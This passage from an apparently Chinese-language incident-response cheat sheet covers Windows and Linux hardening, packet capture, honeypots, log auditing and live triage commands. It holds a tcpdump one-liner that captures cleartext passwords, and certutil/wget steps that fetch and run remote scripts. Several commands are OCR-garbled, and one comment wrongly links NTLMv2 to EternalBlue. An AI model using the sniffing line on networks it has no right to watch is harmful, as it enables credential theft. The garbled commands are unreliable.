name=\"\u5f00\u653eTCP:443\u7aef\u53e3\" dir=in action=allow protocol=TCP localport=443 netsh advfirewall firewall add rule name=\"\u5c4f\u853dTCP:445\u7aef\u53e3\" dir=in action=block protocol=TCP localport=445 netsh advfirewall firewall add rule name=\"\u5141\u8bb8MyApp\" dir=in action=allow program=\"C:\\MyApp\\MyApp.exe\" enable=yes 2.1.3 \u6e05\u9664DNS\u7f13\u5b58\u548cNetios\u7f13\u5b58 # C:> ipconfig /flushdns # C:> nbtstat -R 2.1.4 \u5e94\u7528\u63a7\u5236 # AppLocker\u914d\u7f6e \\# \u5bfc\u5165Applocker\u6a21\u5757 PS C:\\> import-module Applocker \\# \u67e5\u770bsystem32\u76ee\u5f55\u4e0b\u6240\u6709exe\u6587\u4ef6\u7684Applocker\u4fe1\u606f PS C:\\> Get-ApplockerFileinformation -Directory C:\\Windows\\System32\\ -Recurse -FileType Exe \\# \u589e\u52a0\u4e00\u6761\u9488\u5bf9system32\u76ee\u5f55\u4e0b\u6240\u6709\u7684exe\u6587\u4ef6\u7684\u5141\u8bb8\u89c4\u5219 PS C:\\> Get-Childitem C:\\Windows\\System32\\*,exe | Get-ApplockerFileinformation | New-ApplockerPolicy -RuleType Publisher, Hash -User Everyone -RuleNamePrefix System32 2.1.5 IPSEC # 1.\uff09\u4f7f\u7528\u9884\u5171\u4eab\u5bc6\u94a5\u7684\u65b9\u5f0f\u65b0\u5efa\u4e00\u6761IPSEC\u672c\u5730\u5b89\u5168\u7b56\u7565\uff0c\u5e94\u7528\u5230\u6240\u6709\u8fde\u63a5\u548c\u534f\u8bae C:\\> netsh ipsec static add filter filterlist=MyIPsecFilter srcaddr=Any dstaddr=Any protocol=ANY C:\\> netsh ipsec static add filteraction name=MyIPsecAction action=negotiate C:\\> netsh ipsec static add policy name=MyIPsecPolicy assign=yes C:\\> netsh ipsec static add rule name=MyIPsecRule policy=MyIPsecPolicy filterlist=MyIPsecFilter filteraction=MyIPsecAction conntype=all activate=yes psk=\u5bc6\u7801 # 2.\uff09\u65b0\u5efa\u4e00\u6761\u5141\u8bb8\u8bbf\u95ee\u5916\u7f51TCP 80\u548c443\u7aef\u53e3\u7684IPSEC\u7b56\u7565 C:\\> netsh ipsec static add filteraction name=Allow action=permit C:\\> netsh ipsec static add filter filterlist=WebFilter srcaddr=Any dstaddr=Any protocol=TCP dstport=80 C:\\> netsh ipsec static add filter filterlist=WebFilter srcaddr=Any dstaddr=Any protocol=TCP dstport=443 C:\\> netsh ipsec static add rule name=WebAllow policy=MyIPsecPolicy filterlist=WebFilter filteraction=Allow conntype=all activate=yes psk=\u5bc6\u7801 # 3.\uff09\u67e5\u770b\u548c\u7981\u7528\u67d0\u6761IPSEC\u672c\u5730\u5b89\u5168\u7b56\u7565 C:\\> netsh ipsec static show policy name=MyIPsecPolicy C:\\> netsh ipsec static set policy name=MyIPsecPolicy assign=no # \u65b0\u5efa\u4e00\u6761IPSEC\u5bf9\u5e94\u7684\u9632\u706b\u5899\u89c4\u5219\uff0c\u6e90\u5730\u5740\u548c\u76ee\u7684\u5730\u5740\u4e3aany C:\\> netsh advfirewall consec add rule name=\"IPSEC\" endpointl=any endpoint2=any action=requireinrequireout qmsecmethods=default # \u65b0\u5efa\u4e00\u6761IPSEC\u5bf9\u5e94\u7684\u9632\u706b\u5899\u89c4\u5219\uff0c\u6240\u6709\u51fa\u7ad9\u8bf7\u6c42\u5fc5\u987b\u63d0\u4f9b\u9884\u5171\u4eab\u5bc6\u94a5 C:\\> netsh advfirewall firewall add rule name=\"IPSEC_Out\" dir=out action=allow enable=yes profile=any localip=any remoteip=any protocol=any interfacetype=any security=authenticate 2.1.6 \u5176\u4ed6\u5b89\u5168\u7b56\u7565 # \u7981\u7528\u8fdc\u7a0b\u684c\u9762\u8fde\u63a5 C:\\> reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\TerminalServer\" /f /v fDenyTSConnections /t REG_DWORD /d 1 # \u53ea\u53d1\u9001NTLMv2\u54cd\u5e94\uff08\u9632\u6b62\u201c\u6c38\u6052\u4e4b\u84dd\u201d\u6f0f\u6d1e\u653b\u51fb\uff09 C:\\> reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f # \u7981\u7528IPV6 C:\\> reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\TCPIP6\\Parameters /v DisabledComponents /t REG_DWORD /d 255 /f # \u7981\u7528sticky\u952e C:\\> reg add \"HKCU\\ControlPanel\\Accessibility\\StickyKeys\" /v Flags /t REG_SZ /d 506 /f # \u7981\u7528\u7ba1\u7406\u5171\u4eab\uff08Servers/Workstations\uff09 C:\\> reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters /f /v AutoShareServer /t REG_DWORD /d 0 C:\\> reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters /f /v AutoShareWks /t REG_DWORD /d 0 # \u7981\u7528\u6ce8\u518c\u8868\u7f16\u8f91\u5668\u548cCMD\u547d\u4ee4\u63d0\u793a\u7b26 C:\\> reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f C:\\> reg add HKCU\\Software\\Policies\\Microsoft\\Windows\\System /v DisableCMD /t REG_DWORD /d 1 /f # \u542f\u7528UAC C:\\> reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 1 /f # \u542f\u7528\u9632\u706b\u5899\u65e5\u5fd7\u529f\u80fd C:\\> netsh firewall set logging droppedpackets = enable C:\\> netsh firewall set logging connections = enable 2.2 ) LINUX\u7cfb\u7edf\u7bc7 2.2.1 \u670d\u52a1\u7ba1\u7406 # \u67e5\u770b\u670d\u52a1\u72b6\u6001 service --status-all ps -ef OR ps -aux initctl list systemctl list-unit-files # \u542f\u52a8\uff0c\u505c\u6b62\u548c\u7981\u7528\u670d\u52a1 \\# For Upstart services: /etc/init.d/apache2 start | stop | status service apache2 start | stop | status update-rc.d apache2 disable \\# For Systemd services: systemctl start | stop | status ntp.service systemctl disable sshd.service 2.2.2 \u9632\u706b\u5899\u7ba1\u7406 # iptables \u5e38\u7528\u64cd\u4f5c\uff1a iptables-save > filewall_rules.bak \\# \u5bfc\u51fa\u5f53\u524d\u89c4\u5219 iptables -vnL --line \\# \u5217\u51fa\u6240\u6709\u89c4\u5219 iptables -S \\# \u540c\u4e0a iptables -P INPUT DROP \\# \u9ed8\u8ba4\u7b56\u7565\uff0c\u7981\u6b62\u6240\u6709\u8fde\u63a5 iptables -A INPUT -s 10.10.10.10 -j DROP \\# \u7981\u6b62\u5355\u4e2aIP iptables -A INPUT -s 10,10.10.0/24 -j DROP \\# \u7981\u6b62\u4e00\u4e2a\u7f51\u6bb5 iptables -A INPUT -p tcp --dport ssh -s 10.10.10.10 -j DROP \\# \u7981\u6b62\u67d0IP\u8bbf\u95ee\u672c\u673aSSH\u670d\u52a1 iptables -A INPUT -p tcp --dport ssh -j DROP \\# \u7981\u6b62\u8bbf\u95ee\u672c\u673aSSH\u670d\u52a1 iptables -I INPUT 5 -m limit --limit 5/min -j LOG --log-prefix \"iptables denied: \" --log-level 7 \\# \u542f\u7528\u65e5\u5fd7\u8bb0\u5f55 iptables -F \\# \u6e05\u9664\u5f53\u524d\u5df2\u52a0\u8f7d\u7684\u89c4\u5219 2.2.3 DNS\u7f13\u5b58 # Unix/Linux\u7cfb\u7edf\u6ca1\u6709\u7cfb\u7edf\u7ea7\u522bDNS\u7f13\u5b58 2.2.4 \u914d\u7f6eIPSEC # \u5728\u4e24\u53f0\u670d\u52a1\u5668\u4e4b\u95f4\u5efa\u7acbIPSEC\u901a\u9053 \\# 1.\uff09\u6dfb\u52a0\u9632\u706b\u5899\u89c4\u5219\u5141\u8bb8IPSEC\u534f\u8bae iptables -A INPUT -p esp -j ACCEPT iptables -A INPUT -p ah -j ACCEPT iptables -A INPUT -p udp --dport 500 -j ACCEPT iptables -A INPUT -p udp --dport 4500 -j ACCEPT \\# \u5b89\u88c5Racoon apt -y install racoon \\# 2.\uff09\u7f16\u8f91\u914d\u7f6e\u6587\u4ef6\uff1a/etc/ipsec-tools.conf flush; spdflush; spdadd \u4e3b\u673aA\u7684IP\u5730\u5740 \u4e3b\u673aB\u7684IP\u5730\u5740 any -P out ipsec esp/transport//require; spdadd \u4e3b\u673aB\u7684IP\u5730\u5740 \u4e3b\u673aA\u7684IP\u5730\u5740 any -P in ipsec esp/transport//require; \\# 3.\uff09\u7f16\u8f91\u914d\u7f6e\u6587\u4ef6\uff1a/etc/racoon/racoon.conf log notify; path pre_shared_key \"/etc/racoon/psk.txt\"; path certificate \"/etc/racoon/certs\"; remote anonymous { exchange_mode main,aggressive; proposal { encryption_algorithm aes_256; hash_algorithm sha256; authentication_method pre_shared_key; dh_group modp1024; } generate_policy off; } sainfo anonymous{ pfs_group 2; encryption_algorithm aes_256; authentication_algorithm hmac_sha256; compression_algorithm deflate; } \\# 4.\uff09\u6dfb\u52a0\u9884\u5171\u4eab\u5bc6\u94a5 \u4e3b\u673aA\uff1aecho \u4e3b\u673aB 123 >> /etc/racoon/psk.txt \u4e3b\u673aB\uff1aecho \u4e3b\u673aA 123 >> /etc/racoon/psk.txt \\# 5.\uff09\u91cd\u542f\u670d\u52a1\uff0c\u68c0\u67e5\u534f\u5546\u53ca\u914d\u7f6e\u7b56\u7565 service setkey restart setkey -D setkey -DP 3. ) \u68c0\u6d4b\uff08Visibility\uff09 \u00b6 3.1 ) \u7f51\u7edc\u5b89\u5168\u76d1\u63a7 3.1.1 \u6570\u636e\u5305\u6355\u6349\u4e0e\u5206\u6790 1.\uff09TCPDUMP tcpdump -tttt -n -vv \\# \u6253\u5370\u65f6\u6233\uff0c\u7981\u7528\u540d\u79f0\u89e3\u6790\u5e76\u4ee5verbose\u65b9\u5f0f\u663e\u793a tcpdump -nn -c 1000 | awk '{print $3}' | cut -d. -f1-4 | sort -n | uniq -c | sort -nr \\# \u6355\u63491000\u4e2a\u6570\u636e\u5305\uff0c\u627e\u51faTop talkers tcpdump -w target.pcap -i any dst targetIP and port 80 \\# \u5728\u6240\u6709\u63a5\u53e3\u4e0a\u6355\u6349\u76ee\u6807IP\u4e3a\uff1atargetIP\u4e14\u7aef\u53e3\u4e3a80\u7684\u6570\u636e\u5305\u5e76\u5199\u5165target.pcap\u6587\u4ef6 tcpdump host 10.0.0.1 && host 10.0.0.2 \\# \u6355\u6349\u4e24\u4e2a\u4e3b\u673a\u4e4b\u95f4\u7684\u6570\u636e\u5305 tcpdump not net 10.10 && not host 192.168.1.2 \\#\u6355\u6349\u975e10.10\u7f51\u6bb5\u53ca\u975e192.168.1.2\u4e3b\u673a\u7684\u6570\u636e\u5305tcpdump host 10.10.10.10 && \\(10.10.10.20 or 10.10.10.30\\) \\# \u6355\u6349\u4e3b\u673aA\u4e0e\u4e3b\u673aB\u6216C\u7684\u6570\u636e\u5305tcpdump -n -s0 -C 100 -w 001.pcap \\# \u8f6e\u8be2\uff0c\u6587\u4ef6\u5927\u5c0f\u8d85\u8fc7100M\u540e\u81ea\u52a8\u521b\u5efa\u65b0\u6587\u4ef6 tcpdump -w - | ssh ServerIP -p 50005 \"cat - > /tmp/remotecapture.pcap\" \\# \u901a\u8fc7SSH\u4fdd\u5b58\u6570\u636e\u5305\u5230\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\u7684/tmp/remotecapture.pcap\u6587\u4ef6 tcpdump -n -A -s0 port http or port ftp or port smtp or port imap or port pop3 | egrep -i 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|P asswd=|password=|pass:|user:|username:|password:|login:|pass|user' --color=auto --line-buffered -B20 \\# \u6293\u53d6\u660e\u6587\u5bc6\u7801 tcpdump -s 1500 -A '(tcp[((tcp[12:1] & 0xf0) >> 2)+5:1] = 0x01) and (tcp[((tcp[12:1] & 0xf0) >> 2):1] = 0x16)' \\#\u67e5\u627e\u81ea\u7b7e\u540d\u8bc1\u4e66 2.\uff09TSHARK tshark -nr 001.pcap -Y \"ssl.handshake.ciphersuites\" -Vx | grep \"ServerName:\" | sort | uniq -c | sort -r \\# \u63d0\u53d6\u8bc1\u4e66Server Name\u5b57\u6bb5 tshark -D \\# \u5217\u51fa\u6240\u6709\u53ef\u7528\u63a5\u53e3 tshark -i eth0 -i eth1 \\# \u76d1\u542c\u591a\u4e2a\u63a5\u53e3 tshark -nn -w 001.pcap \\# \u7981\u7528\u540d\u79f0\u89e3\u6790\u5e76\u4fdd\u5b58\u5230\u6587\u4ef6 tshark arp or icmp \\# \u6355\u6349arp\u6216\u8005icmp tshark \"host \u4e3b\u673aA && host \u4e3b\u673aB\" \\# \u6355\u6349\u4e24\u4e2a\u4e3b\u673a\u4e4b\u95f4\u7684\u6570\u636e\u5305 tshark -r 001.pcap \\# \u8bfb\u53d6\u6570\u636e\u5305 tshark -n -e ip.src -e ip.dst -T fields -E separator=, -2 -R ip -r 001.pcap \\# \u63d0\u53d6\u6e90/\u76ee\u7684IP\u5730\u5740 tshark -n -e ip.src -e dns,qry.name -E separator=';' -T fields port 53 \\# \u63d0\u53d6DNS\u67e5\u8be2\u7684\u6e90IP\u53caDNS\u67e5\u8be2\u7684\u57df\u540d tshark -2 -R http.request -T fields -E separator=';' -e http.host -e http.request.uri -r 001.pcap \\# \u63d0\u53d6HTTP\u8bf7\u6c42\u4e2d\u7684host\u53c2\u6570\u548c\u8bf7\u6c42uri tshark -n -c 150 I awk '{print $4}' I sort -n | uniq -c | sort -nr \\# \u63d0\u53d6top talkers tshark -q -z io,phs -r 001.pcap \\# \u534f\u8bae\u7edf\u8ba1 tshark -n -c 100 -e ip.src -Y \"dns.flags.response eq 1\" -T fields port 53 \\# \u63d0\u53d6DNS\u54cd\u5e94\u6570\u636e\u5305\u7684DNS\u670d\u52a1\u5668\u5730\u5740 tshark -n -e http.request.uri -Y http.request -T fields | grep exe \\# \u63d0\u53d6\u901a\u8fc7http\u8bf7\u6c42\u65b9\u5f0f\u4e0b\u8f7dexe\u53ef\u6267\u884c\u6587\u4ef6\u7684\u6570\u636e\u5305 3.\uff09SNORT snort -T -c /etc/snort/snort.conf \\# \u914d\u7f6e\u6587\u4ef6\u6d4b\u8bd5 snort -dv -r 001.log \\# \u8bfb\u53d6\u6570\u636e\u5305 snort -dvr 001.log icmp \\# \u63d0\u53d6icmp\u6570\u636e\u5305 snort -K ascii -l 001 \\# \u4ee5ASCII\u683c\u5f0f\u663e\u793a snort -q -A console -i eth0 -c /etc/snort/snort.conf \\# \u5728\u7ec8\u7aef\u4e0a\u663e\u793asnort events echo 'log tcp 192.168.1.0/24 any -> 192.168.1.95 22 ( msg: \"ssh access\" ; sid:1618008; )' > 001.rule && snort -T -c 001.rule \\# \u89c4\u5219\u6d4b\u8bd5 mkdir logs && snort -vd -c 001.rule -r 001.pcap -A console -l logs \\# \u6267\u884c\u89c4\u5219 4.\uff09Bro NSM \u5b89\u88c5\u53ca\u4e0b\u8f7d\u76f8\u5173\u8f6f\u4ef6\u5305\u548c\u6570\u636e\u5305 apt -y install bro bro-aux pip install bro-pkg bro-pkg install bro/hosom/file-extraction wget https://www.malware-traffic-analysis.net/2018/01/12/2018-01-12-NanoCore-RAT-traffic.pcap.zip wget https://www.bro.org/static/exchange-2013/faf-exercise.pcap bro -r 2018-01-12-NanoCore-RAT-traffic.pcap \\# \u4ecepcap\u6587\u4ef6\u4e2d\u8bfb\u53d6\u5e76\u521b\u5efa\u76f8\u5173\u65e5\u5fd7\u6587\u4ef6 bro -r faf-exercise.pcap /root/.bro-pkg/scratch/file-extraction/scripts/plugins/extract-pe.bro && ls -lhct ./extract_files/ \\# \u63d0\u53d6\u51faexe\u6587\u4ef6bro -r faf-exercise.pcap /usr/share/bro/policy/frameworks/files/extract-all-files.bro \\# \u63d0\u53d6\u591a\u4e2a\u7c7b\u578b\u7684\u6587\u4ef6 bro -C -r faf-exercise.pcap && cat ssl.log | bro-cut server_name , subject , issuer \\# \u63d0\u53d6\u8bc1\u4e66\u4e2d\u7684server_name,issuer\u548csubjects\u5b57\u6bb5 cat conn.log | bro-cut id.orig_h , id.orig_p , id.resp_h , id.resp_p , proto , conn_state \\# \u63d0\u53d6\u6e90IP\uff0c\u6e90\u7aef\u53e3\uff0c\u76ee\u7684IP\uff0c\u76ee\u7684\u7aef\u53e3\uff0c\u534f\u8bae\u7c7b\u578b\uff0ctcp\u6807\u8bb0 cat dns.log | bro-cut query | sort -u \\# \u63d0\u53d6DNS\u67e5\u8be2name cat http.log | bro-cut id.orig_h , id.orig_p , id.resp_h , id.resp_p , host , uri , referrer \\# \u63d0\u53d6\u6e90IP\uff0c\u6e90\u7aef\u53e3\uff0c\u76ee\u7684IP\uff0c\u76ee\u7684\u7aef\u53e3\uff0chost\uff0curi\uff0creferrer\u5b57\u6bb5 cat http.log | bro-cut user_agent | sort -u \\# \u63d0\u53d6user_agent\u5b57\u6bb5 5.\uff09EDITCAP editcap -F pcap -c 1000 orignal.pcap out_split.pcap \\# \u4ee51000\u4e3a\u5355\u4f4d\u8fdb\u884c\u5206\u5272 editcap -F pcap -t+3600 orignal.pcap out_split.pcap \\# \u4ee51\u5c0f\u65f6\u4e3a\u5355\u4f4d\u8fdb\u884c\u5206\u5272 6.\uff09MERGECAP mergecap -w merged_cap.pcap capl.pcap cap2.pcap cap3.pcap \\# \u5408\u5e76\u591a\u4e2a\u6587\u4ef6 7.\uff09PacketTotal https://www.packettotal.com/app/analysis?id=c8c11b792272ac19a49299a3687466be&name=files 8.\uff09NetworkMiner http://netres.ec/?b=173588E 3.2 ) \u871c\u7f50\u6280\u672f 3.2.1 WINDOWS\u7cfb\u7edf\u7bc7 1.\uff09 \u7aef\u53e3\u871c\u7f50 \\# \u539f\u7406\uff1a\u76d1\u542c\u7aef\u53e3\uff0c\u5f53\u5ba2\u6237\u7aef\u6210\u529f\u5efa\u7acbTCP\uff083\u6b21\u63e1\u624b\uff09\u8fde\u63a5\u540e\uff0c\u8bb0\u5f55\u8bbf\u95ee\u65e5\u5fd7\uff0c\u7136\u540e\u6dfb\u52a0\u9632\u706b\u5899\u89c4\u5219\u5c01\u7981\u6b64IP PS C:\\> certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Pwdrkeg/honeyport/master/honeyport.ps1 PS C:\\> .\\honeyport.ps1 -Ports 4444,22,21,23 -WhiteList 192.168.10.1,192.168.10.2 -Block $true -Verbose PS C:\\> Get-EventLog HoneyPort \\# \u67e5\u770b\u65e5\u5fd7\u8bb0\u5f55\u4fe1\u606f PS C:\\> stop-job -name HoneyPort \\# \u505c\u6b62\u4efb\u52a1 PS C:\\> remove-job -name HoneyPort \\# \u79fb\u9664\u4efb\u52a1 3.2.2 LINUX\u7cfb\u7edf\u7bc7 1.\uff09 \u7aef\u53e3\u871c\u7f50 \\# \u539f\u7406\u540c\u4e0a wget https://raw.githubusercontent.com/gchetrick/honeyports/master/honeyports-0.5.py python honeyports-0.5.py -p 1234 -h 192.168.1.100 -D 3.3 ) (PASSIVE)\u76d1\u63a7DNS\u89e3\u6790 apt -y install dnstop dnstop -l 3 eth0 dnstop -l 3 001.pcap | out.txt 3.4 ) \u65e5\u5fd7\u5ba1\u8ba1 1.\uff09WINDOWS \\# \u589e\u52a0\u65e5\u5fd7\u6587\u4ef6\u5927\u5c0f\u8fdb\u884c\u65e5\u5fd7\u5ba1\u8ba1 C:\\> reg add HKLM\\Software\\Policies\\Microsoft\\Windows\\Eventlog\\Application /v MaxSize /t REG_DWORD /d 0x19000 C:\\> reg add HKLM\\Software\\Policies\\Microsoft\\Windows\\Eventlog\\Security /v MaxSize /t REG_DWORD /d 0x64000 C:\\> reg add HKLM\\Software\\Policies\\Microsoft\\Windows\\EventLog\\System /v MaxSize /t REG_DWORD /d 0x19000 \\# \u67e5\u770bWindows\u4e8b\u4ef6\u65e5\u5fd7-\u5b89\u5168\u65e5\u5fd7\u7684\u914d\u7f6e C:\\> wevtutil gl Security \\# \u68c0\u67e5\u5ba1\u6838\u7b56\u7565 auditpol /get /category:* \\# \u5bf9\u6240\u6709\u9879\u542f\u7528\u6210\u529f\u548c\u5931\u8d25\u7684\u5ba1\u6838\u7b56\u7565 C:\\> auditpol /set /category:* /success:enable /failure:enable \\# \u67e5\u770b\u5df2\u914d\u7f6e\u7684\u4e8b\u4ef6\u65e5\u5fd7\u7684\u6982\u8981\u4fe1\u606f PS C:\\> Get-Eventlog -list \\# \u53d6\u6700\u8fd15\u6761\u5e94\u7528\u7a0b\u5e8f\u65e5\u5fd7 PS C:\\> Get-Eventlog -newest 5 -logname application | Format-List \\# \u53d6Eent ID\uff1a4672\u7684\u6240\u6709\u65e5\u5fd7 PS C:\\> Get-Eventlog Security | ? { $_.Eventid -eq 4672} \\# \u767b\u5f55\u4e0e\u6ce8\u9500\u4e8b\u4ef6 PS C:\\> Get-Eventlog Security 4625,4634,4647,4624,4625,4648,4675,6272,6273,6274,6275,6276,6277,6278,6279,6280,4649,4778,4779,4800,4801,4802,4803,5378,5632,5633,4964 -after ((get-date).addDays(-1)) \\# DPAPI\u884c\u4e3a\uff0c\u8fdb\u7a0b\u7ec8\u6b62\uff0cRPC\u4e8b\u4ef6 PS C:\\> Get-EventLog Security 4692,4693,4694,4695,4689,5712 -after ((get-date).addDays(-1)) \\# \u6587\u4ef6\u5171\u4eab\uff0c\u6587\u4ef6\u7cfb\u7edf\uff0cSAM\uff0c\u6ce8\u518c\u8868\uff0c\u8bc1\u4e66\u65f6\u95f4 PS C:\\ Get-EventLog Security 4671,4691,4698,4699,4700,4701,4702,5148,5149,5888,5889,5890,4657,5039,4659,4660,4661,4663,4656,4658,4690,4874,4875,4880,4881,4882,4884,4885,4888,4890,4891,4892,4895,4896,4898,5145,5140,5142,5143,5144,5168,5140,5142,5143,5144,5168,5140,5142,5143,5144,5168,4664,4985,5152,5153,5031,5140,5150,5151,5154,5155,5156,5157,5158,5159 -after ((get-date).addDays(-1)) \\# \u67e5\u770bEent ID\uff1a4672\u7684\u8be6\u7ec6\u4fe1\u606f Get-Eventlog Security | ? { $_.Eventid -eq 4672} | Format-List 2.\uff09LINUX \\# \u8ba4\u8bc1\u65e5\u5fd7 tail /var/log/auth. log grep -i \"fail\" /var/log/auth. log tail /var/log/secure grep -i \"fail\" /var/log/secure \\# samba\uff0ccron,sudo\u76f8\u5173\u65e5\u5fd7 grep -i samba /var/log/syslog grep -i samba /var/log/messages grep -i cron /var/log/syslog grep -i sudo /var/log/auth. log grep -i sudo /var/log/secure \\# Apache 404\u9519\u8bef\u65e5\u5fd7 grep 404 apache.log | grep -v -E \"favicon.ico|robots.txt\" \\# \u76d1\u63a7\u65b0\u6587\u4ef6\uff0c5\u5206\u949f\u5237\u65b0\u4e00\u6b21 watch -n 300 -d ls -lR /web_root 4. ) \u54cd\u5e94\uff08\u53d6\u8bc1\uff09 \u00b6 4.1 ) LIVE TRIAGE\uff08\u6536\u96c6\u8fd0\u884c\u65f6\u7cfb\u7edf\u4fe1\u606f\uff09 4.1.1 WINDOWS\u7cfb\u7edf\u7bc7 1.\uff09\u7cfb\u7edf\u4fe1\u606f C:\\> echo %DATE% %TIME% C:\\> hostname C:\\> systeminfo C:\\> systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" C:\\> wmic csproduct get name C:\\> wmic bios get serialnumber C:\\> wmic computersystem list brief C:\\> psinfo -accepteula -s -h -d 2.\uff09\u7528\u6237\u4fe1\u606f C:\\> whoami C:\\> net users C:\\> net localgroup administrators C:\\> net group administrators C:\\> wmic rdtoggle list C:\\> wmic useraccount list C:\\> wmic group list C:\\> wmic netlogin get name,lastlogon,badpasswordcount C:\\> wmic netclient list brief C:\\> doskey /history > history.txt 3.\uff09\u7f51\u7edc\u4fe1\u606f C:\\> netstat -e C:\\> netstat -naob C:\\> netstat -nr C:\\> netstat -vb C:\\> nbtstat -s C:\\> route print C:\\> arp -a C:\\> ipconfig /displaydns C:\\> netsh winhttp show proxy C:\\> ipconfig /allcompartments /all C:\\> netsh wlan show interfaces C:\\> netsh wlan show all C:\\> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections\\WinHttpSettings\" C:\\> type %SYSTEMROOT%\\system32\\drivers\\etc\\hosts C:\\> wmic nicconfig get descriptions,IPaddress,MACaddress C:\\> wmic netuse get name,username,connectiontype, localname 4.\uff09\u670d\u52a1\u4fe1\u606f C:\\> at C:\\> tasklist C:\\> tasklist /svc C:\\> tasklist /SVC /fi \"imagename eq svchost.exe\" C:\\> tasklist /SVC /fi \"imagename eq svchost.exe\" C:\\> schtasks C:\\> net start C:\\> sc query C:\\> wmic service list brief | findstr \"Running\" C:\\> wmic service list conf ig C:\\> wmic process list brief C:\\> wmic process list status C:\\> wmic process list memory C:\\> wmic job list brief PS C:\\> Get-Service | Where-Object { $_.Status -eq \"running\" } 5.\uff09\u7b56\u7565\u3001\u8865\u4e01\u3001\u73af\u5883\u53d8\u91cf\u4fe1\u606f C:\\> set C:\\> gpresult /r C:\\> gpresult /z > output.txt C:\\> gpresult /H report.html /F C:\\> wmic qfe 6.\uff09\u81ea\u542f\u52a8\u4fe1\u606f C:\\> wmic startup list full C:\\> wmic ntdomain list brief 6.1\uff09\u68c0\u67e5\u81ea\u542f\u52a8\u6587\u4ef6\u76ee\u5f55 C:\\> dir \"%SystemDrive%\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" C:\\> dir \"%SystemDrive%\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\"C:\\> dir %userprofile%\\Start Menu\\Programs\\Startup C:\\> %ProgramFiles%\\Startup\\ C:\\> dir C:\\Windows\\Start Menu\\Programs\\startup C:\\> dir \"C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" C:\\> dir \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" C:\\> dir \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" C:\\> dir \"%ALLUSERSPROFILE%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" C:\\> dir \"%ALLUSERSPROFILE%\\Start Menu\\Programs\\Startup\" C:\\> type C:\\Windows\\winstart.bat C:\\> type %windir%\\wininit.ini C:\\> type %windir%\\win.ini C:\\> type C:\\Autoexec.bat\" 6.2\uff09\u4f7f\u7528autoruns C:\\> autorunsc -accepteula -m 6.3\uff09\u81ea\u542f\u52a8\u6ce8\u518c\u8868\u4f4d\u7f6e HKEY_CLASSES_ROOT: C:\\> reg query HKCR\\Comfile\\Shell\\Open\\Command C:\\> reg query HKCR\\Batfile\\Shell\\Open\\Command C:\\> reg query HKCR\\htafile\\Shell\\Open\\Command C:\\> reg query HKCR\\Exefile\\Shell\\Open\\Command C:\\> reg query HKCR\\Exefiles\\Shell\\Open\\Command C:\\> reg query HKCR\\piffile\\shell\\open\\command HKEY_CURRENT_USERS: C:\\> reg query \"HKCU\\Control Panel\\Desktop\" C:\\> reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"C:\\> reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" C:\\> reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Runonce\" C:\\> reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\" C:\\> reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\" C:\\> reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\" C:\\> reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Windows\\Run\" C:\\> reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Windows\\Load\" C:\\> reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Windows\\Scripts\" C:\\> reg query \"HKCU\\Software\\Microsoft\\WindowsNT\\CurrentVersion\\Windows\" /f run C:\\> reg query \"HKCU\\Software\\Microsoft\\WindowsNT\\CurrentVersion\\Windows\" /f load C:\\> reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"C:\\> reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs\" C:\\> reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\LastVisitedMRU\" C:\\> reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComD1g32\\OpenSaveMRU\" C:\\> reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\LastVisitedPidlMRU\"C:\\> reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComD1g32\\OpenSavePidlMRU\" /sC:\\> reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\" C:\\> reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\" C:\\> reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" C:\\> reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Applets\\RegEdit\" /v LastKey C:\\> reg query \"HKCU\\Software\\Microsoft\\InternetExplorer\\\" TypedURLs C:\\> reg query \"HKCU\\Software\\Policies\\Microsoft\\Windows\\ControlPanel\\Desktop\" HKEY_LOCAL_MACHINE: C:\\> reg query 